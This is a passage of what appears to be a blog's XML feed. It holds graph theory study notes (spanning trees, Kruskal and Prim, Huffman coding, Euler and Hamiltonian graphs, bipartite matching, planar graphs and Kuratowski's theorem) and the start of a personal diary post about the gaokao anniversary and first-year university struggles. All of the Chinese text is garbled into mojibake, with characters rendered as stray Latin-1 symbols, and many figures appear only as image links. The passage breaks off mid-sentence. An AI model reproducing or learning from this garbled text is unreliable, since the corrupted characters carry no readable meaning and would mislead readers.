é™¤Gä¸­ä»»ä¸€æ¡è¾¹åï¼Œä¾¿ä¸è¿é€šï¼ˆnâ‰¥2ï¼‰</li><li>Gä¸­æ¯ä¸€å¯¹ç»“ç‚¹ä¹‹é—´æœ‰å”¯ä¸€çš„åŸºæœ¬é€šè·¯ï¼ˆnâ‰¥2ï¼‰</li></ul><p><strong>å®šç†</strong>ï¼šä»»æ„éå¹³å‡¡æ ‘T&#x3D;(n,m)éƒ½è‡³å°‘æœ‰ä¸¤ç‰‡å¶[åˆ©ç”¨æ¡æ‰‹å®šç†å’Œm&#x3D;n-1è¯å¾—]</p><h6 id="ç”Ÿæˆæ ‘åŠç®—æ³•"><a href="#ç”Ÿæˆæ ‘åŠç®—æ³•" class="headerlink" title="ç”Ÿæˆæ ‘åŠç®—æ³•"></a>ç”Ÿæˆæ ‘åŠç®—æ³•</h6><p><strong>ç”Ÿæˆæ ‘</strong>ï¼šç»™å®šå›¾Gï¼ŒGçš„æŸä¸ªç”Ÿæˆå­å›¾æ˜¯æ ‘ï¼Œåˆ™ç§°ä¸ºGçš„ç”Ÿæˆæ ‘ï¼Œç”Ÿæˆæ ‘ä¸­çš„è¾¹ç§°ä¸ºæ ‘æï¼ŒGä¸­ä¸å­˜åœ¨ç”Ÿæˆæ ‘ä¸­çš„è¾¹ç§°ä¸ºå¼¦ï¼Œæ‰€æœ‰å¼¦çš„é›†åˆç§°ä¸ºç”Ÿæˆæ ‘çš„è¡¥ã€‚</p><p><strong>å®šç†</strong>ï¼šä¸€ä¸ªå›¾å­˜åœ¨ç”Ÿæˆæ•°çš„å……åˆ†å¿…è¦æ¡ä»¶æ˜¯Gæ˜¯<strong>è¿é€šçš„</strong>ã€‚</p><p>åˆ©ç”¨ä»¥ä¸‹ç®—æ³•å¯ä»¥æ±‚å¾—è¿é€šå›¾çš„ç”Ÿæˆæ ‘</p><p><strong>ç ´åœˆæ³•</strong></p><p>æ¯æ¬¡åˆ é™¤å›è·¯ä¸­çš„ä¸€æ¡è¾¹ï¼Œå…¶åˆ é™¤çš„è¾¹çš„æ€»æ•°ä¸ºm-n+1</p><p><strong>é¿åœˆæ³•</strong></p><p>æ¯æ¬¡é€‰å–Gä¸­çš„ä¸€æ¡ä¸å·²é€‰å–çš„è¾¹ä¸æ„æˆå›è·¯çš„è¾¹ï¼Œé€‰å–çš„è¾¹çš„æ€»æ•°ä¸ºn-1ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230608202756936-1024x495.png"></p><p><strong>å¹¿åº¦ä¼˜å…ˆæœç´¢ç®—æ³•</strong></p><p>å¯ä»¥ä»ä»»æ„ç»“ç‚¹å¼€å§‹ï¼Œæ¯”å¦‚è¯´ä»aå¼€å§‹ï¼ŒæŠŠå®ƒæ ‡è®°ä¸ºï¼(ï¼)ã€‚ ä¸aé‚»æ¥çš„ç»“ç‚¹ æ˜¯bå’Œcï¼ŒæŠŠå®ƒä»¬æ ‡è®°ä¸º ï¼‘(ï½)ã€‚ æ¥ä¸‹æ¥å¯¹é‚»æ¥äºbå’Œcçš„æœªæ ‡è®°çš„ç»“ç‚¹eå’Œfåšæ ‡è®°ã€‚æŠŠå®ƒä»¬åˆ†åˆ«æ ‡è®°ä¸ºï¼’(ï½‚)å’Œï¼’(ï½ƒ)ã€‚æŒ‰è¿™æ ·çš„æ–¹æ³•ç»§ç»­ï¼Œç›´åˆ°æ‰€æœ‰çš„ç»“ç‚¹éƒ½æœ‰æ ‡è®°ä¸ºæ­¢ã€‚ä¸€ç»„å¯èƒ½çš„æ ‡è®°å¦‚å›¾ã€‚è¿æ¥æ¯ä¸ªç»“ç‚¹åˆ°å…¶å‰é©±(åœ¨ç»“ç‚¹çš„æ ‡è®°ä¸­æŒ‡æ˜)çš„è¾¹å°±æ„æˆäº†ä¸€æ£µç”Ÿæˆæ ‘</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230608202904939-1024x321.png"></p><h6 id="æœ€å°ç”Ÿæˆæ ‘"><a href="#æœ€å°ç”Ÿæˆæ ‘" class="headerlink" title="æœ€å°ç”Ÿæˆæ ‘"></a>æœ€å°ç”Ÿæˆæ ‘</h6><p>Gæ˜¯è¿é€šæ˜¯èµ‹æƒå›¾ï¼ŒTæ˜¯Gçš„ä¸€é¢—ç”Ÿæˆæ ‘ï¼ŒTçš„æ¯ä¸ªæ ‘ææ‰€èµ‹æƒå€¼ä¹‹å’Œç§°ä¸ºTçš„æƒï¼Œè®°ä¸ºW(T)ï¼ŒGä¸­æ—¢æœ‰æœ€å°æƒçš„ç”Ÿæˆæ ‘ç§°ä¸ºGçš„æœ€å°ç”Ÿæˆæ ‘ã€‚</p><p><strong>Kruskal ç®—æ³•</strong></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230608213908630-1024x929.png"></p><p><strong>Primç®—æ³•</strong></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230608213940614-1024x717.png"></p><hr><h5 id="æ ¹æ•°"><a href="#æ ¹æ•°" class="headerlink" title="æ ¹æ•°"></a>æ ¹æ•°</h5><p>ä¸€ä¸ªæœ‰å‘å›¾ï¼Œè‹¥ç•¥å»æ‰€æœ‰æœ‰å‘è¾¹çš„æ–¹å‘æ‰€å¾—åˆ°çš„æ— å‘å›¾æ˜¯ä¸€æ£µæ ‘ï¼Œåˆ™ç§°ä¹‹ä¸ºæœ‰å‘æ ‘ã€‚</p><p>ä¸€é¢—éå¹³å‡¡çš„æœ‰å‘æ ‘ï¼Œå¦‚æœæ°æœ‰ä¸€ä¸ªç»“ç‚¹çš„å…¥åº¦ä¸º0ï¼Œå…¶ä½™æ‰€æœ‰ç»“ç‚¹çš„å…¥åº¦å‡ä¸º1ï¼Œåˆ™ç§°ä¹‹ä¸ºæ ¹æ ‘æˆ–å¤–å‘æ ‘ã€‚å…¥åº¦ä¸º0çš„ç»“ç‚¹ç§°ä¸ºæ ¹(root)ï¼›å‡ºåº¦ä¸º0çš„ç»“ç‚¹ç§°ä¸ºå¶ï¼›å…¥åº¦ä¸º1ï¼Œå‡ºåº¦å¤§äº0çš„ç»“ç‚¹ç§°ä¸ºå†…ç‚¹ï¼›å†…ç‚¹å’Œè·Ÿç»Ÿç§°ä¸ºåˆ†æ”¯ç‚¹ã€‚åœ¨æ ¹æ ‘ä¸­ï¼Œä»æ ¹åˆ°ä»»ä¸€ç»“ç‚¹vçš„é€šè·¯é•¿åº¦ï¼Œç»Ÿç§°ä¸ºç»“ç‚¹vçš„å±‚æ•°ï¼›æ‰€æœ‰ç»“ç‚¹çš„å±‚æ•°ä¸­æœ€å¤§çš„ç§°ä¸ºæ ¹æ ‘çš„é«˜ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230608215318864-1024x319.png"></p><h6 id="æ ¹æ ‘çš„éå†"><a href="#æ ¹æ ‘çš„éå†" class="headerlink" title="æ ¹æ ‘çš„éå†"></a>æ ¹æ ‘çš„éå†</h6><p>åº”ç”¨æœ€å¹¿æ³›çš„æ˜¯äºŒå…ƒæ ‘çš„éå†</p><p>å…ˆæ ¹æ¬¡åºéå†ï¼š</p><ul><li>æ ¹</li><li>å·¦å­æ ‘</li><li>å³å­æ ‘</li></ul><p>ä¸­æ ¹æ¬¡åºéå†ï¼š</p><ul><li>å·¦å­æ ‘</li><li>æ ¹</li><li>å³å­æ ‘</li></ul><p>åæ ¹æ¬¡åºéå†ï¼š</p><ul><li>å·¦å­æ ‘</li><li>å³å­æ ‘</li><li>æ ¹</li></ul><h6 id="æœ€ä¼˜æ ‘ä¸å“ˆå¤«æ›¼ç®—æ³•"><a href="#æœ€ä¼˜æ ‘ä¸å“ˆå¤«æ›¼ç®—æ³•" class="headerlink" title="æœ€ä¼˜æ ‘ä¸å“ˆå¤«æ›¼ç®—æ³•"></a>æœ€ä¼˜æ ‘ä¸å“ˆå¤«æ›¼ç®—æ³•</h6><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230608215643992-1024x199.png"></p><p><strong>æœ€ä¼˜æ ‘</strong>ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230608215716080-1024x203.png"></p><h6 id="å“ˆå¤«æ›¼ç®—æ³•"><a href="#å“ˆå¤«æ›¼ç®—æ³•" class="headerlink" title="å“ˆå¤«æ›¼ç®—æ³•"></a>å“ˆå¤«æ›¼ç®—æ³•</h6><p>è¿‡ç¨‹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230608215851736.png"></p><hr><h5 id="æ¬§æ‹‰å›¾"><a href="#æ¬§æ‹‰å›¾" class="headerlink" title="æ¬§æ‹‰å›¾"></a>æ¬§æ‹‰å›¾</h5><p>å®šä¹‰ï¼š è®¾Gæ˜¯æ— å­¤ç«‹ç»“ç‚¹çš„å›¾ï¼Œ è‹¥å­˜åœ¨ä¸€æ¡é€šè·¯(å›è·¯ï¼Œç»è¿‡å›¾ä¸­æ¯<strong>è¾¹</strong>ä¸€æ¬¡ä¸”ä»…ä¸€æ¬¡ã€‚åˆ™ç§°æ­¤é€šè·¯(å›è·¯)ä¸ºè¯¥å›¾çš„ä¸€æ¡æ¬§æ‹‰é€šè·¯(å›è·¯)ã€‚å…·æœ‰<strong>æ¬§æ‹‰å›è·¯</strong>çš„å›¾ç§°ä¸ºæ¬§æ‹‰å›¾ã€‚</p><h6 id="æ¬§æ‹‰å›¾çš„åˆ¤å®š"><a href="#æ¬§æ‹‰å›¾çš„åˆ¤å®š" class="headerlink" title="æ¬§æ‹‰å›¾çš„åˆ¤å®š"></a>æ¬§æ‹‰å›¾çš„åˆ¤å®š</h6><p><strong>æ— å‘å›¾</strong>ï¼š</p><p>æ— å‘å›¾å…·æœ‰ä¸€æ¡æ¬§æ‹‰é€šè·¯ï¼Œå½“ä¸”ä»…å½“Gæ˜¯è¿é€šçš„ï¼Œä¸”ä»…æœ‰é›¶ä¸ªæˆ–ä¸¤ä¸ªå¥‡åº¦æ•°ç»“ç‚¹ã€‚</p><p>æ— å‘å›¾æ˜¯æ¬§æ‹‰å›¾ï¼Œå½“ä¸”ä»…å½“Gæ˜¯è¿é€šçš„ï¼Œä¸”ä»…æœ‰é›¶ä¸ªå¥‡åº¦æ•°ç»“ç‚¹ã€‚</p><p><strong>æœ‰å‘å›¾</strong>ï¼š</p><p>æœ‰å‘å›¾Gå…·æœ‰ä¸€æ¡æ¬§æ‹‰é€šè·¯ï¼Œå½“ä¸”ä»…å½“Gæ˜¯è¿é€šçš„ï¼Œä¸”é™¤äº†ä¸¤ä¸ªç»“ç‚¹ ä»¥å¤–ï¼Œå…¶ä½™ç»“ç‚¹çš„å…¥åº¦ç­‰äºå‡ºåº¦ã€‚è€Œè¿™ä¸¤ä¸ªä¾‹å¤–çš„ç»“ç‚¹ä¸­ï¼Œä¸€ä¸ªç»“ç‚¹çš„å…¥åº¦æ¯”å‡ºåº¦å¤§1ï¼Œå¦ä¸€ä¸ªç»“ç‚¹çš„å‡ºåº¦æ¯”å…¥åº¦å¤§1ã€‚</p><p>æœ‰å‘å›¾Gæ˜¯æ¬§æ‹‰å›¾ï¼Œå½“ä¸”ä»…å½“Gæ˜¯è¿é€šçš„ï¼Œä¸”æ‰€æœ‰ç»“ç‚¹çš„å…¥åº¦ç­‰äºå‡ºåº¦ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230608220110560-1024x400.png"></p><p>æ¬§æ‹‰å›¾ä¸­æ‰¾æ¬§æ‹‰å›è·¯ï¼šå¯èƒ½çš„æƒ…å†µä¸‹ï¼Œä¸èµ°æ¡¥ã€å‰²è¾¹ã€‘</p><hr><h5 id="å“ˆå¯†é¡¿å›¾"><a href="#å“ˆå¯†é¡¿å›¾" class="headerlink" title="å“ˆå¯†é¡¿å›¾"></a>å“ˆå¯†é¡¿å›¾</h5><p>ç»è¿‡å›¾ä¸­æ¯ä¸ª<strong>ç»“ç‚¹</strong>ä¸€æ¬¡ä¸”ä»…ä¸€æ¬¡çš„é€šè·¯ (å›è·¯)ç§°ä¸ºå“ˆå¯†é¡¿é€šè·¯(å›è·¯)ã€‚å­˜åœ¨<strong>å“ˆå¯†é¡¿å›è·¯</strong>çš„å›¾ç§°ä¸ºå“ˆå¯†é¡¿å›¾</p><h6 id="å“ˆå¯†é¡¿å›¾çš„åˆ¤å®š"><a href="#å“ˆå¯†é¡¿å›¾çš„åˆ¤å®š" class="headerlink" title="å“ˆå¯†é¡¿å›¾çš„åˆ¤å®š"></a>å“ˆå¯†é¡¿å›¾çš„åˆ¤å®š</h6><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230608220452745-1024x200.png"></p><p>æ³¨æ„è¿™åªæ˜¯åˆ¤å®šçš„é¢å¿…è¦æ¡ä»¶ï¼Œä¸€èˆ¬æƒ…å†µä¸‹æˆ‘ä»¬é€šè¿‡æ‰¾åä¾‹ï¼Œä¹Ÿå°±æ˜¯<strong>å»æ‰çš„ç»“ç‚¹æ ‘å°äºå¾—åˆ°çš„å›¾çš„è¿é€šåˆ†æ”¯æ•°</strong>ï¼Œæ¥è¯æ˜æŸå›¾ä¸æ˜¯å“ˆå¯†é¡¿å›¾ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230608220653423-1024x189.png"></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230608220713879-1024x143.png"></p><hr><h5 id="å¶å›¾"><a href="#å¶å›¾" class="headerlink" title="å¶å›¾"></a>å¶å›¾</h5><h6 id="å¶å›¾-1"><a href="#å¶å›¾-1" class="headerlink" title="å¶å›¾"></a>å¶å›¾</h6><p>è‹¥æ— å‘å›¾çš„ç»“ç‚¹é›†ï¼¶èƒ½å¤Ÿåˆ’åˆ†ä¸ºä¸¤ä¸ªå­é›†ï¼¶ï¼‘ï¼Œï¼¶ï¼’ï¼Œæ»¡è¶³ï¼¶ï¼‘âˆ©ï¼¶ï¼’ï¼âŒ€ã€‚ä¸”ï¼¶ï¼‘âˆªï¼¶ï¼’ï¼ï¼¶ã€‚ä½¿å¾—ï¼§ä¸­ä»»æ„ä¸€æ¡è¾¹çš„ä¸¤ä¸ªç«¯ç‚¹ï¼Œä¸€ä¸ªå±äºï¼¶1ï¼Œå¦ä¸€ä¸ªå±äºï¼¶ï¼’.åˆ™ç§°ï¼§ä¸ºå¶å›¾æˆ–äºŒéƒ¨å›¾ã€äºŒåˆ†å›¾ã€‚ï¼¶ï¼‘ å’Œ ï¼¶ï¼’ ç§°ä¸ºäº’è¡¥ç»“ç‚¹å­é›†ã€‚</p><p><strong>å®Œå…¨å¶å›¾</strong></p><p>åœ¨å¶å›¾ä¸­ï¼Œè‹¥ï¼¶ï¼‘ä¸­çš„æ¯ä¸ªç»“ç‚¹ä¸ï¼¶ï¼’ä¸­çš„æ¯ä¸ªç»“ç‚¹éƒ½æœ‰ä¸”ä»…æœ‰ä¸€æ¡è¾¹ç›¸å…³è”ï¼Œåˆ™ç§°å¶å›¾ï¼§ä¸º<strong>å®Œå…¨å¶å›¾</strong>æˆ–å®Œå…¨äºŒéƒ¨å›¾ã€ å®Œå…¨äºŒåˆ†å›¾ã€‚</p><p><strong>å¶å›¾çš„åˆ¤å®š</strong></p><p>æ— å‘å›¾ä¸ºå¶å›¾çš„å……åˆ†å¿…è¦æ¡ä»¶æ˜¯Gçš„<strong>æ‰€æœ‰å›è·¯</strong>çš„é•¿åº¦å‡ä¸ºå¶æ•°ã€‚</p><h6 id="åŒ¹é…"><a href="#åŒ¹é…" class="headerlink" title="åŒ¹é…"></a>åŒ¹é…</h6><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230608221222771.png"></p><h6 id="åŒ¹é…å­˜åœ¨æ€§é—®é¢˜"><a href="#åŒ¹é…å­˜åœ¨æ€§é—®é¢˜" class="headerlink" title="åŒ¹é…å­˜åœ¨æ€§é—®é¢˜"></a>åŒ¹é…å­˜åœ¨æ€§é—®é¢˜</h6><p><strong>éœå°”å®šç†</strong>ï¼šå¶å›¾ä¸­å­˜åœ¨ä»V1åˆ°V2çš„åŒ¹é…çš„å……åˆ†å¿…è¦æ¡ä»¶æ˜¯V1ä¸­ä»»æ„kä¸ªç»“ç‚¹è‡³å°‘ä¸V2ä¸­çš„kä¸ªç»“ç‚¹ç›¸é‚»æ¥ã€‚k&#x3D;1,2ï¼ŒÂ·Â·Â·ï¼ŒV1ã€‚</p><p><strong>tæ¡ä»¶</strong>ï¼šè®¾Gæ˜¯ä¸€ä¸ªå¶å›¾ï¼š</p><ul><li>V1ä¸­æ¯ä¸ªç»“ç‚¹è‡³å°‘å…³è”tæ¡è¾¹ã€‚ ï¼ˆtä¸ºæ­£æ•´æ•°ï¼‰</li><li>V2ä¸­æ¯ä¸ªç»“ç‚¹è‡³å¤šå…³è”tæ¡è¾¹ã€‚</li></ul><blockquote><p>å¦‚æœå­˜åœ¨è¿™ä¸ªtï¼Œåˆ™ä¸€å®šæ˜¯å¶å›¾ï¼Œä½†æ˜¯æ²¡æœ‰tä¸ä¸€å®šä¸æ˜¯å¶å›¾ã€‚</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230608221753959-1024x154.png"></p><hr><h5 id="å¹³é¢å›¾"><a href="#å¹³é¢å›¾" class="headerlink" title="å¹³é¢å›¾"></a>å¹³é¢å›¾</h5><p>å¦‚æœ<strong>èƒ½å¤Ÿ</strong>æŠŠä¸€ä¸ªæ— å‘å›¾Gçš„æ‰€æœ‰ç»“ç‚¹å’Œè¾¹ç”»åœ¨ä¸€ä¸ªå¹³é¢ä¸Šï¼Œä½¿å¾—ä»»ä½•ä¸¤è¾¹é™¤å…¬å…±ç»“ç‚¹ä¹‹å¤–æ²¡æœ‰å…¶ä»–äº¤å‰ç‚¹ï¼Œåˆ™ç§°Gä¸ºå¹³é¢å›¾ï¼Œå¦åˆ™æ˜¯éå¹³é¢å›¾ã€‚</p><h6 id="å¹³é¢å›¾çš„åˆ¤æ–­â€”â€”è§‚å¯Ÿ"><a href="#å¹³é¢å›¾çš„åˆ¤æ–­â€”â€”è§‚å¯Ÿ" class="headerlink" title="å¹³é¢å›¾çš„åˆ¤æ–­â€”â€”è§‚å¯Ÿ"></a>å¹³é¢å›¾çš„åˆ¤æ–­â€”â€”è§‚å¯Ÿ</h6><p>æ‰¾å‡ºåŸºæœ¬å›è·¯ï¼Œå†çœ‹æœ‰æ²¡æœ‰ç«¯ç‚¹åœ¨å…¶ä¸Šçš„å¯èƒ½äº¤å‰çš„é€šè·¯ï¼Œå°†è¿™äº›é€šè·¯åˆ†åˆ«æ”¾åˆ°å›è·¯çš„å†…éƒ¨æˆ–è€…å¤–éƒ¨ï¼Œçœ‹çœ‹èƒ½å¦é¿å…äº¤å‰ã€‚</p><h6 id="æ¬§æ‹‰å…¬å¼"><a href="#æ¬§æ‹‰å…¬å¼" class="headerlink" title="æ¬§æ‹‰å…¬å¼"></a>æ¬§æ‹‰å…¬å¼</h6><p>åœ¨å¹³é¢å›¾Gçš„ä¸€ä¸ªå¹³é¢è¡¨ç¤ºä¸­ï¼š</p><p><strong>é¢</strong>ï¼šç”±è¾¹æ‰€åŒ…å›´çš„å…¶å†…éƒ¨ä¸å«å›¾çš„ç»“ç‚¹å’Œè¾¹çš„åŒºåŸŸï¼Œç§°ä¸ºGçš„ä¸€ä¸ªé¢</p><p><strong>è¾¹ç•Œ</strong>ï¼šåŒ…å«è¯¥é¢çš„è¯¸è¾¹æ‰€æ„æˆçš„å›è·¯ç§°ä¸ºè¿™ä¸ªé¢çš„è¾¹ç•Œ</p><p><strong>æ¬¡æ•°</strong>ï¼šé¢rçš„è¾¹ç•Œçš„é•¿åº¦ç§°ä¸ºè¯¥é¢çš„æ¬¡æ•°ï¼Œè®°ä¸ºD(r)</p><p>åŒºåŸŸé¢ç§¯æœ‰é™çš„ç§°ä¸ºæœ‰é™é¢ï¼ŒåŒºåŸŸé¢ç§¯æ— é™çš„ç§°ä¸ºæ— é™é¢</p><blockquote><p>æ˜¾ç„¶ï¼Œå¹³é¢å›¾æœ‰ä¸”ä»…æœ‰ä¸€ä¸ªæ— é™é¢ï¼</p><p><strong>å¹³é¢å›¾æ‰€æœ‰é¢çš„æ¬¡æ•°ä¹‹å’Œç­‰äºå…¶è¾¹æ•°çš„2å€</strong></p></blockquote><h6 id="æ¬§æ‹‰å…¬å¼-1"><a href="#æ¬§æ‹‰å…¬å¼-1" class="headerlink" title="æ¬§æ‹‰å…¬å¼"></a>æ¬§æ‹‰å…¬å¼</h6><p>ä¸€ä¸ªå‡¸å¤šé¢ä½“[å¹³é¢å›¾ä¹Ÿé€‚ç”¨]ï¼šnä¸ªé¡¶ç‚¹[ç»“ç‚¹]ï¼Œmä¸ªæ£±[è¾¹]ï¼Œrä¸ªé¢ï¼Œæœ‰</p><p><strong>n-m+r&#x3D;2</strong></p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œ<strong>ç»“ç‚¹æ•°-è¾¹æ•°+é¢æ•°&#x3D;2</strong></p><h6 id="æ¨è®º1"><a href="#æ¨è®º1" class="headerlink" title="æ¨è®º1"></a>æ¨è®º1</h6><p><strong>ï½â‰¤ï¼“ï½ï¼ï¼–</strong></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230608222759452.png"></p><h6 id="æ¨è®º2"><a href="#æ¨è®º2" class="headerlink" title="æ¨è®º2"></a>æ¨è®º2</h6><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230608222823137.png"></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230608222838426-1024x173.png"></p><h6 id="åº“æ‹‰æ‰˜å¤«æ–¯åŸºå®šç†"><a href="#åº“æ‹‰æ‰˜å¤«æ–¯åŸºå®šç†" class="headerlink" title="åº“æ‹‰æ‰˜å¤«æ–¯åŸºå®šç†"></a>åº“æ‹‰æ‰˜å¤«æ–¯åŸºå®šç†</h6><p>ä¸€ä¸ªå›¾æ˜¯å¹³é¢å›¾çš„å……åˆ†å¿…è¦æ¡ä»¶æ˜¯å®ƒçš„ä»»ä½•å­å›¾éƒ½ä¸å¯èƒ½æ”¶ç¼©ä¸ºK5æˆ–K33</p><p>æ¨è®ºï¼šä¸€ä¸ªå›¾æ˜¯éå¹³é¢å›¾çš„å……åˆ†å¿…è¦æ¡ä»¶æ˜¯å®ƒå­˜åœ¨ä¸€ä¸ªèƒ½æ”¶ç¼©ä¸ºK5æˆ–K33çš„å­å›¾ï¼Œæˆ‘ä»¬å°†K5å’ŒK33ç§°ä¸ºåº“æ‹‰æ‰˜å¤«æ–¯åŸºå›¾</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230608223020462-1024x108.png"></p>]]></content>
      
      
      <categories>
          
          <category> è¯¾å†… </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è¯¾å†… </tag>
            
            <tag> ç¦»æ•£ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è¦çª’æ¯äº†ï¼Œä½†æ˜¯æƒ³ç†¬è¿‡å»</title>
      <link href="/2023/06/06/%E8%A6%81%E7%AA%92%E6%81%AF%E4%BA%86%EF%BC%8C%E4%BD%86%E6%98%AF%E6%83%B3%E7%86%AC%E8%BF%87%E5%8E%BB/"/>
      <url>/2023/06/06/%E8%A6%81%E7%AA%92%E6%81%AF%E4%BA%86%EF%BC%8C%E4%BD%86%E6%98%AF%E6%83%B3%E7%86%AC%E8%BF%87%E5%8E%BB/</url>
      
        <content type="html"><![CDATA[<blockquote><p>å»å¹´çš„ä»Šå¤©ï¼Œæˆ‘èººåœ¨åºŠä¸Šï¼Œç¬¬äºŒå¤©å°±æ˜¯é«˜è€ƒäº†ã€‚</p></blockquote><p>å»å¹´æˆ‘èµ°å‡ºé«˜è€ƒè€ƒåœºçš„æ—¶å€™ï¼Œåœ¨æƒ³ä»€ä¹ˆå‘¢ï¼Œä¸ç®¡è€ƒçš„æ€ä¹ˆæ ·ï¼Œæˆ‘ä¸€å®šæ˜¯å¾ˆå¼€å¿ƒçš„å§ï¼Œæƒ³ç€æœªæ¥ï¼Œæ»¡è„‘å­éƒ½æ˜¯è‡ªç”±ï¼Œæˆ‘ä¼šæƒ³èµ·é«˜è€ƒå‰å»ä¹¦åº—ä¹°çš„é‚£æœ¬ã€Šæ¢…èŠ±æ˜“æ•°ã€‹ï¼Œæˆ‘å‘Šè¯‰è‡ªå·±ï¼Œé«˜è€ƒå®Œé‚£ä¸ªæš‘å‡ï¼Œæˆ‘è¦å…ˆæŠŠæ˜“ç»ç²¾è¯»ä¸€éï¼Œç„¶åå­¦ä¹ å¥‡é—¨éç”²ï¼Œç„¶åå­¦ä¹ æ¢…èŠ±æ˜“æ•°Â·Â·Â·Â·Â·Â·æˆ‘æŠŠè‡ªå·±çš„ä¹¦æ¡Œæ•´ç†äº†ï¼Œæœ‰ä¸€ä¸ªæŸœå­é‡Œæ”¾ä¸Šäº†æ‰€æœ‰é«˜è€ƒå‰æ²¡èƒ½æ¥å¾—åŠè¯»çš„ä¹¦ï¼Œæœ‰å‡ æœ¬è¿˜æ˜¯æ–°çš„Â·Â·Â·Â·Â·Â·æˆ‘è¿˜å‘Šè¯‰è‡ªå·±ï¼Œè¦çœ‹äº›å“²å­¦ä¹¦ç±ï¼Œè¦æ¯å¤©å†™éšç¬”ï¼Œè„‘å­é‡Œé¢æƒ³è±¡è¿™è¿™äº›ï¼Œæœ‰å¥½å¤šæƒ³åšçš„äº‹æƒ…ï¼Œå¾ˆå¼€å¿ƒï¼Œå¾ˆè‡ªç”±ã€‚</p><p>ç„¶åå‘¢ï¼Œç„¶åï¼Œé‚£äº›ä¸œè¥¿è¢«æ°¸è¿œçš„æ”¾åœ¨é‚£ä¸ªæŸœå­é‡Œï¼Œæ—©å°±å·²ç»æœ‰äº†ç°å°˜ï¼Œå“²å­¦ï¼Œå†æ²¡æœ‰ç¢°è¿‡ï¼Œkindleï¼Œæ€»æ˜¯å……æ»¡ç”µç„¶åå¾…æœºåˆ°ç”µæ± è€—å°½ï¼Œç»§ç»­å……ç”µï¼Œç»§ç»­åƒç°ã€‚</p><p>ç„¶åå‘¢ï¼Œé‚£ä¸ªæš‘å‡ï¼Œç¡®å®šæ–¹å‘ä¹‹åå¼€å§‹é©¬ä¸åœè¹„çš„å­¦ä¹ ï¼Œå„ç§å­¦ä¹ ï¼Œä¸åœçš„é€šå®µï¼Œç¬¬äºŒå¤©æ‹ä¸€å¼ æ—¥å‡ºï¼Œç„¶åç¡è¿‡å»ï¼Œè§‰å¾—è‡ªå·±çœŸçš„å¾ˆåŠªåŠ›ã€‚å¼€å­¦ä¹‹åï¼Œä¸ºäº†è¿›å·¥ä½œå®¤ï¼Œå¼€å§‹å·ï¼Œå¼€å§‹ç†¬å¤œï¼Œå¼€å§‹ä¸å»ä¸Šè¯¾ï¼Œå¼€å§‹ä¸å†æ—©èµ·ã€‚</p><p>ç„¶åå‘¢ï¼Œè¿›äº†å·¥ä½œå®¤æ„Ÿè§‰ä¸€èº«è½»æ¾ï¼Œå¼€å§‹æ‘†ï¼Œå¼€å§‹å—œé…’å¦‚å‘½ï¼Œå¼€å§‹äº¤é™…ï¼Œå¼€å§‹å‘å¾€æ‰€è°“çš„è‡ªç”±ï¼Œå¼€å§‹å˜æˆç‰¹ç«‹ç‹¬è¡Œçš„ï¼Œäººäººè®¨åŒçš„å°ä¸‘ã€‚æ¯å¤©ä¾æ—§å¿™ç¢Œï¼Œå´ä¸€äº‹æ— æˆï¼Œä»€ä¹ˆéƒ½åœ¨å¹²ï¼Œä»€ä¹ˆéƒ½æ²¡å¹²ã€‚</p><hr><p>è€Œï¼Œæ˜å¤©åˆæ˜¯é«˜è€ƒäº†ï¼Œè¿‡äº†ä¸€å¹´ï¼Œè¿™ä¸€å¹´å¤ªè¿‡æ¿€çƒˆï¼Œå¤ªè¿‡ç‚½çƒ­ï¼Œå¤ªå¤§ï¼Œå¤§åˆ°æˆ‘ä¸çŸ¥é“æ€ä¹ˆæ¥ä½å®ƒï¼Œæ˜¨å¤©æƒ³äº†ä¸€æ•´å¤©ç•™çº§çš„äº‹æƒ…ï¼ŒçœŸæƒ³å†è¿‡ä¸€ä¸ªå¤§ä¸€å•Šï¼Œæƒ³é‡æ–°å¥‹æ–—ï¼Œæƒ³é‡æ–°æŠ“ä½é‚£äº›æ²¡èƒ½æŠ“ä½çš„ä¸œè¥¿ï¼Œä½†æ˜¯ï¼Œæ€»æ˜¯è¿™æ ·ç»™è‡ªå·±æ‰¾é€€è·¯ï¼ŒçœŸçš„ä¸å¸…ã€‚</p><blockquote><hr><p>è™½ç„¶èº«ä½“å’Œç²¾ç¥éƒ½å·²ç»æåº¦ç–²å€¦äº†ï¼Œä½†æ˜¯å‘¢ï¼Œè¿˜æ˜¯å†³å®šç»§ç»­è¿™æ ·è›®æ¨ªçš„å¾€å‰å†²äº†ï¼Œå› ä¸ºè¿™æ ·çš„äººç”Ÿæ‰å¤Ÿé…·ï¼</p></blockquote><p>è¯´è¿™äº›æœ‰ä»€ä¹ˆæ„ä¹‰å‘¢ï¼Œæˆ‘é«˜ä¸­ä¸‰å¹´ä¹Ÿå°±é‚£æ 